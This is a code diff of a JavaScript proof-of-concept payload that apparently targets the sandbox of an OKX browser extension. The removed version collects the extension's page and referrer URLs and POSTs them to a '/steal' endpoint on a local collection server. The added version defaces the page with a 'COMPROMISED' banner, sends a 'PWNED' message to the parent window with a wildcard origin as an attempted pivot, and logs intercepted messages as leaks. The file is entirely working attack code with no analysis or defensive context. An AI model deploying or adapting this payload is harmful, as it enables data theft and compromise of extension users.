@@ -1,19 +1,15 @@
-// This executes inside extension sandbox when fetched
-(async () => {
-  // Confirm RCE works
-  console.log('[POC] RCE achieved in OKX sandbox!');
-  
-  // Collect extension data
-  const stolen = {
-    extUrl: window.location.href,
-    parentUrl: document.referrer,
-    timestamp: Date.now()
-  };
-  
-  // Send to your server.js
-  await fetch('http://localhost:8080/steal', {
-    method: 'POST',
-    body: JSON.stringify(stolen),
-    headers: {'Content-Type': 'application/json'}
-  });
-})();
+// STRONG PoC payload
+document.body.innerHTML = "<h1>🔥 EXTENSION COMPROMISED</h1>";
+
+console.log("Origin:", location.origin);
+
+// try pivot
+window.parent.postMessage({
+    type: "PWNED",
+    data: "sandbox_rce"
+}, "*");
+
+// listen for data
+window.addEventListener("message", e => {
+    console.log("LEAK:", e.data);
+});
